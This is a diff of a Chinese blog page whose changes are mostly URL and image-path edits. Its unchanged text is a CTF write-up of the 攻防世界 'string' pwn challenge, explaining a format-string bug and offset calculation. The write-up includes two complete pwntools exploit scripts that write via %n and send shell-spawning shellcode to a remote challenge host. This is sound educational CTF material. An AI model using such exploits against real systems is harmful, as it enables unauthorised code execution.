@@ -27,7 +27,7 @@
   <meta name="keywords" content="pwn题" />
 
 
-<link rel="canonical" href="http://example.com/2021/08/20/string/string/">
+<link rel="canonical" href="http://example.com/2021/08/20/string/">
 
 
 
@@ -117,12 +117,12 @@ Nirvana = 清風微醺 = 凌恒</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewf5l51j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicli3sbvtj20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
         </ul>
       </div>
     </header>
@@ -153,7 +153,7 @@ Nirvana = 清風微醺 = 凌恒</title>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/20/string/string/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/20/string/">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/images/avatar.jpg">
@@ -170,7 +170,7 @@ Nirvana = 清風微醺 = 凌恒</title>
 
     <p>攻防世界 string 应该是新手区数一数二的难题，难点在理解程序流程。</p>
 <p>先观察主函数:</p>
-<p><img data-src="1.png" alt></p>
+<p><img data-src="./string/1.png" alt></p>
 <h1 id="alarm函数"><a class="markdownIt-Anchor" href="#alarm函数">#</a> alarm 函数</h1>
 <h2 id="什么是alarm函数"><a class="markdownIt-Anchor" href="#什么是alarm函数">#</a> 什么是 alarm 函数？</h2>
 <p>如上图所示，在做一些 pwn 题的时候，我们有时会遇到 <code>alarm(0x3Cu)</code>  函数。alarm 函数中的参数 <code>0x3Cu</code>  是十六进制无符号数，即十进制对应 60，所以该函数的作用是在程序运行 60 秒后，给进程发送 SIGALRM 信号，如果不另编写程序接受处理此信号，则默认结束此程序。</p>
@@ -182,17 +182,17 @@ Nirvana = 清風微醺 = 凌恒</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将程序名为ProgrammName中的alarm替换为isnan</span><br><span class="line">&gt; sed -i s/alarm/isnan/g ./ProgrammName</span><br></pre></td></tr></table></figure>
 <p>不过这道题 alarm 函数对于程序影响不大，可以不用关闭。</p>
 <h1 id="程序流程"><a class="markdownIt-Anchor" href="#程序流程">#</a> 程序流程</h1>
-<p><img data-src="./1.png" alt></p>
+<p><img data-src="./string/1.png" alt></p>
 <p>如图，系统分配内存给 v4,v4 数组里的内容分别是 68 和 85。</p>
 <p>main 函数中重点关注</p>
-<p><img data-src="./3.png" alt></p>
+<p><img data-src="./string/3.png" alt></p>
 <p>程序把 v4 和 v4+1 的地址给泄露出来了。</p>
 <p>程序继续进入 sub_400D72 ()，提示输入 name 后进入 sub_400A7D ()，这里不再赘述，不选择 east 和 1 就会被干掉。</p>
 <p>选择 east 和 1 后我们进入 sub_400BB9 ()</p>
-<p><img data-src="./4.png" alt></p>
+<p><img data-src="./string/4.png" alt></p>
 <p>这里发现格式化字符串漏洞。</p>
 <p>最后进入 sub_400CA6 ()</p>
-<p><img data-src="./5.png" alt></p>
+<p><img data-src="./string/5.png" alt></p>
 <p>发现若 a1 [0] 等于 a1 [1]，就可将 v1 变成可执行函数</p>
 <p>（mmap 是一种内存映射文件的方法)，可通过 read 函数读入一串机器码，然后运行，这相当于是把 shellcode 送你脸上来了。</p>
 <p>#综合分析</p>
@@ -229,7 +229,7 @@ printf(a);<br>
 <p>方法二：输入 aaaaaaaa-% p-% p-% p-% p-% p-% p</p>
 <p>注意：64 位程序不能用 % x 来确定偏移量，且 64 位程序需要输入 aaaaaaaa 而不是 aaaa</p>
 <p><strong>利用 % x 来获取对应栈的内存，但建议使用 % p，可以不用考虑位数的区别。–转自 ctf-wiki</strong></p>
-<p><img data-src="./6.png" alt></p>
+<p><img data-src="./string/6.png" alt></p>
 <p>如图 0x6161616161616161 即为我们输入 aaaaaaaa 的十六进制值，也就是说 print 栈中第一个参数的偏移为 8.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&#x27;b&#x27;</span>*<span class="number">85</span>+<span class="string">&#x27;%20$n&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+p64(addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>其中 b 乘 85 是我们需要 v4 [0] 变成的值，a 乘 6 为填充字符来使堆栈内容对齐，计算一下地址前面共有 96 个字符（%20$n 算五个字符，这里博主因为这个检查了快一个小时），偏移量就应该加上 96/8=12，故最后的偏移量为 20。</p>
@@ -237,9 +237,9 @@ printf(a);<br>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">49213</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./stRing&#x27;)</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;invincible&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;So, where you will go?east or up?&quot;</span>)</span><br><span class="line">a = r.recvuntil(<span class="string">&quot;:&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">r.sendline(<span class="string">&#x27;east&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;And, you wish is:&quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;b&#x27;</span>*<span class="number">85</span>+<span class="string">&#x27;%20$n&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+p64(addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>)</span><br><span class="line">shellcode =asm(shellcraft.sh()) </span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>last：记得把文件名改成 stRing，由于 string 是关键字，运行时可能会出错。</p>
 <h2 id="解法二更简单的解法"><a class="markdownIt-Anchor" href="#解法二更简单的解法">#</a> 解法二：更简单的解法</h2>
-<p><img data-src="./4.png" alt></p>
+<p><img data-src="./string/4.png" alt></p>
 <p>如图，程序中有一段：give me an address，这其实就给我们提示了，v2 是调用 print 前的最后一个参数，也就是说它在程序中的偏移量是 printf 第一个参数的偏移量减一。我们可以验证一下</p>
-<p><img data-src="./7.png" alt></p>
+<p><img data-src="./string/7.png" alt></p>
 <p>如图我们输入的 1111 的十六进制即为 0x457，偏移量为 7。</p>
 <p>完整 exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">57932</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./string&#x27;)</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;invincible&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;east&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;And, you wish is:&quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;b&#x27;</span>*<span class="number">85</span>+<span class="string">&#x27;%7$n&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>)</span><br><span class="line">shellcode =asm(shellcraft.sh()) </span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure>
@@ -257,7 +257,7 @@ printf(a);<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2021-08-21 10:34:05" itemprop="dateModified" datetime="2021-08-21T10:34:05+08:00">2021-08-21</time>
+    <time title="修改时间：2021-08-21 10:40:01" itemprop="dateModified" datetime="2021-08-21T10:40:01+08:00">2021-08-21</time>
   </span>
 </div>
 
@@ -288,7 +288,7 @@ printf(a);<br>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2021/08/20/string/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">http://example.com/2021/08/20/string/string/</a>
+    <a href="http://example.com/2021/08/20/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">http://example.com/2021/08/20/string/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -307,7 +307,7 @@ printf(a);<br>
     <div class="item left">
       
 
-  <a href="/2021/08/20/%E5%A3%B0%E6%98%8E/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhfehz7j20zk0m8u0x.jpg" title="版权声明">
+  <a href="/2021/08/20/%E5%A3%B0%E6%98%8E/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciundwu5j20zk0m8n9e.jpg" title="版权声明">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> 版权声明</span>
   <h3>版权声明</h3>
@@ -335,7 +335,7 @@ printf(a);<br>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li class="active"><a href="/2021/08/20/string/string/" rel="bookmark" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></li>
+          <li class="active"><a href="/2021/08/20/string/" rel="bookmark" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -437,20 +437,20 @@ printf(a);<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/" title="分类于 版权声明">版权声明</a>
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
 </div>
 
-    <span><a href="/2021/08/20/%E5%A3%B0%E6%98%8E/" title="版权声明">版权声明</a></span>
+    <span><a href="/2021/08/20/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+<a href="/categories/%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/" title="分类于 版权声明">版权声明</a>
 </div>
 
-    <span><a href="/2021/08/20/string/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></span>
+    <span><a href="/2021/08/20/%E5%A3%B0%E6%98%8E/" title="版权声明">版权声明</a></span>
   </li>
 
   </ul>
@@ -481,7 +481,7 @@ printf(a);<br>
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: '2021/08/20/string/string/',
+    path: '2021/08/20/string/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
